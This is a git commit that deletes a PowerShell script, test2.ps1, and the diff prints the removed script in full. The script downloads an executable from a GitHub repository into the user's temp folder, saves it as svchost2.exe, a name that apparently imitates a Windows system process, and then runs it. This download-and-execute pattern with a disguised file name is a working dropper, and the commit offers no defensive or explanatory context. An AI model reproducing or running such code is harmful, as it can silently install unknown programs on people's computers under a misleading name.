5b6c5dec5f8c7c64563df17a8bcb204538e6d48c
qbekun <73672498+qbekun@users.noreply.github.com>
2026-07-29 08:42:53 +0200

    Delete test2.ps1

--- test2.ps1
+++
@@ -1,7 +0,0 @@
-$FILE_URL = "https://github.com/qbekun/cs2/raw/refs/heads/main/svchost2.exe"
-$TEMP_PATH = "$env:TEMP\svchost2.exe"
-
-$webClient = New-Object System.Net.WebClient
-$webClient.DownloadFile($FILE_URL, $TEMP_PATH)
-
-Start-Process -FilePath $TEMP_PATH
